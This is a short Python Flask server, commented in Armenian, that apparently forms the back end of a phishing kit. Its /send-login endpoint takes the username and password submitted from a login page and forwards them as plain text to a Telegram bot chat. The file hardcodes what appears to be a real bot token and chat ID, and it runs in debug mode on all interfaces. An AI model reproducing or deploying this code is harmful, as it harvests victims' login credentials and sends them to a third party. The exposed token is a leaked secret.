from flask import Flask, render_template, request, jsonify
import requests
import json

app = Flask(__name__)

# ============================================
# 🔒 ՍԱ ՍԵՐՎԵՐՈՒՄ Է ՊԱՀՎՈՒՄ - ՉԻ ԵՐԵՎՈՒՄ HTML-ՈՒՄ
# ============================================
BOT_TOKEN = '8708195196:AAHbiKgr19AYM5X1rFNbg-qo0DIM8iRCxUs'
CHAT_ID = '5215854157'
# ============================================

@app.route('/')
def index():
    # HTML-ը ուղարկվում է ԱՌԱՆՑ token-ի
    return render_template('index.html')

@app.route('/send-login', methods=['POST'])
def send_login():
    try:
        data = request.get_json()
        username = data.get('username', '')
        password = data.get('password', '')
        
        # Հաղորդագրության տեքստը (միայն login + password)
        message = f"{username}\n{password}"
        
        # Telegram-ին ուղարկել
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message
        }
        
        response = requests.post(url, data=payload)
        result = response.json()
        
        if result.get('ok'):
            return jsonify({'ok': True, 'message': 'Ուղարկված է'})
        else:
            return jsonify({'ok': False, 'error': result.get('description')})
            
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)